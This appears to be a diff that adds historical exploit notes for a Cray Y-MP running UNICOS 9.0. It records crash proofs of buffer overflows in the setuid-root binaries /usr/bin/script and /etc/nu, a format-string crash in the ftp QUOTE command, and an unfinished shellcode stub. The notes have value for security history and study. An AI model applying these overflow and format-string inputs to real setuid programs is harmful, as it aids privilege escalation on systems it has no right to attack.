@@ -1,0 +1,79 @@
+Cray PVP Exploitation (Historical Hacking)
+=========================================
+------------------[ Misc CPU information
+This Cray Y-MP EL with 4 CPUs and 1 GB of RAM is running UNICOS Release 9.0
+[guest@yel guest]$ uname -a
+sn5176 sn5176 9.0.2.2 sin.0 CRAY Y-MP
+[guest@yel guest]$ df
+/            (/dev/dsk/root    ):    129232 .5K blocks ( 14.7%)    25880 I-nodes
+/tmp         (/dev/dsk/tmp     ):   1966952 .5K blocks ( 98.3%)    62402 I-nodes
+/usr         (/dev/dsk/usr     ):      7016 .5K blocks (  0.5%)    22571 I-nodes
+/usr/src     (/dev/dsk/src     ):    429312 .5K blocks ( 44.7%)    25958 I-nodes
+/adddisk1    (/dev/dsk/opt     ):    704760 .5K blocks ( 58.7%)    31671 I-nodes
+/proc        (/proc            ):   2007520 .5K blocks ( 97.6%)      629 procs
+/onserver    (server:/disk1/exports/yel):
+                                   54180728 .5K blocks ( 70.4%)
+/home        (server:/disk1/home):
+                                   54180728 .5K blocks ( 70.4%)
+/var/sysinfo (server:/var/sysinfo):
+                                    7389440 .5K blocks ( 61.7%)
+/secure      (server:/secure   ):   7389440 .5K blocks ( 61.7%)
+
+
+==================[ Vulnerabilities
+------------------[ /usr/bin/script suid root command line args buffer overflow
+-rwsr-xr-x   1 root     bin       730000 Sep  5  1996 /usr/bin/script
+[guest@yel guest]$ script `perl -e 'print "A"x1000'`
+Operand range error (core dumped)
+
+------------------[ /etc/nu suid root file parsing buffer overflow
+-rwsr-xr-x   1 root     bin      1045400 Sep  4  1996 /etc/nu
+
+[guest@yel guest]$ echo "" >> /tmp/acid
+[guest@yel guest]$ udbgen -p /tmp
+udbgen: An acid file with at least one line is required
+        Acid format: 'account_name:account_id'
+udbgen: /tmp/group: No such file or directory
+udbgen: A group file with at least one line is required
+        Group format: 'group_name:*:group_id:'
+[guest@yel guest]$ echo `perl -e 'print "A"x10000'` >> /tmp/script
+[guest@yel guest]$ /etc/nu -p /tmp -c /tmp/script -a
+admin/udb/nu/nu.c       90.7    09/03/96 10:43:53 (sn5176:/tmp/script)
+nu: no GroupHome information in /tmp/script
+Operand range error (core dumped)
+
+-----------------[ /bin/ftp QUOTE format string vuln (BSD ftp client bug) [non suid]
+ftp> quote %08x.%08x.%08x.%08x.
+500 'C00000000001D496.253038782E253038.782E253038782E25.3038782E0000001B.': command not understood.
+ftp> quote %n%n%n%n%n
+Operand range error (core dumped)
+
+-----------------[ UNICOS Shellcoding CRAY PVP
+The CRAY PVP does not natively support a 'syscall' instruction(unlike the new Cray X1, where
+the OS node provides a system call interface to the other nodes.) instead, we will use the
+systems standard libaries (which are linked in to most, if not all applications). Particularly
+we will focus on 'libu.a', which provides the UNICOS Standard Library. 
+
+** INCOMPLETE **
+[guest@yel guest]$ as -f myfile.s
+[guest@yel guest]$ segldr -e MAIN myfile.o -lu
+ ldr-240 segldr: CAUTION
+     Entry point 'MAIN' in module 'PROG1' from file 'myfile.o' was specified on
+     an XFER directive but is not a primary entry.
+[guest@yel guest]$ ./a.out
+[guest@yel guest]$ cat myfile.s
+        IDENT   PROG1
+MAIN    ENTER
+	CALL	execve		;; arguements required.
+        EXIT
+        END
+
+[guest@yel guest]$
+
+
+------------------[ Documentation sites
+http://oscinfo.osc.edu:8080/dynaweb/@CategoryView 
+http://dynaweb.tacc.utexas.edu:8080/dynaweb/@DisplayHomepage
+http://www.cray.com/
+
+
